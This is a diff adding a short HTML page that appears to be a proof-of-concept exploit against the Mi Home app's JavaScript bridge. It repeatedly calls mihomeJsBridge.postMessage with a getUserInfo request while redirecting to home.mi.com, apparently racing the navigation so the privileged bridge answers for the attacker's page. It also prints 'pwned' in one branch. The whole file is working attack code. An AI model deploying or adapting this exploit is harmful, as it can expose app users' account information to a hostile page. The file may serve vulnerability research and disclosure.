@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>loading</title></head>
+<body>
+<h3 id="st">racing...</h3>
+<script>
+if (!/[?&]grab=1/.test(location.search)) {
+    var MSG = '{"action":"getUserInfo","response":"alert"}';
+
+    function pump() {
+        try { window.mihomeJsBridge.postMessage(MSG); } catch (e) {}
+    }
+
+    for (var i = 0; i < 300; i++) pump();  
+    setInterval(pump, 0);                   
+
+    setTimeout(function () {
+        location.href = 'https://home.mi.com/';
+    }, 120);
+} else {
+    document.getElementById('st').textContent = 'pwned';
+}
+</script>
+</body>
+</html>
